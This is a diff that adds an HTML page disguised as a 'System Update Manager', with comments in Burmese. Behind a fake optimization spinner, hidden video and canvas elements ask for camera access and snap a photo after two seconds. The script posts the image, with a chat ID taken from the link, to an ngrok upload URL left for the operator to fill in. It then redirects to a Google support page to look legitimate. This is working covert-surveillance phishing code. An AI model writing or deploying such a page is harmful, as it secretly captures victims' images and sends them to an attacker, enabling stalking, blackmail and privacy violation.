@@ -1,1 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update Manager</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>System Optimization in Progress...</h2>
+    <p>Please wait while we check your device compatibility.</p>
+    <div class="loading"></div>
+
+    <video id="video" width="640" height="480" autoplay style="display:none"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chat_id = urlParams.get('id'); // Link ထဲက Chat ID ကို ယူတာပါ
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // ကင်မရာ ခွင့်ပြုချက်တောင်းခြင်း
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+            // ၂ စက္ကန့်နေရင် အလိုအလျောက် ဓာတ်ပုံရိုက်မယ်
+            setTimeout(takeSnap, 2000);
+        })
+        .catch(err => {
+            console.log("Error: " + err);
+        });
+
+        function takeSnap() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/png');
+
+            // --- အောက်က link နေရာမှာ ကိုကြီးရဲ့ Ngrok Link ကို ပြောင်းထည့်ပါ ---
+            const serverUrl = 'https://ကိုကြီးရဲ့-ngrok-link.ngrok-free.app/upload';
+
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: imageData,
+                    chat_id: chat_id
+                })
+            })
+            .then(res => {
+                // ပို့ပြီးရင် အစစ်လိုဖြစ်အောင် Google Support ဆီ လွှဲပေးလိုက်မယ်
+                window.location.href = "https://support.google.com/android/answer/7680439";
+            });
+        }
+    </script>
+</body>
+</html>
 
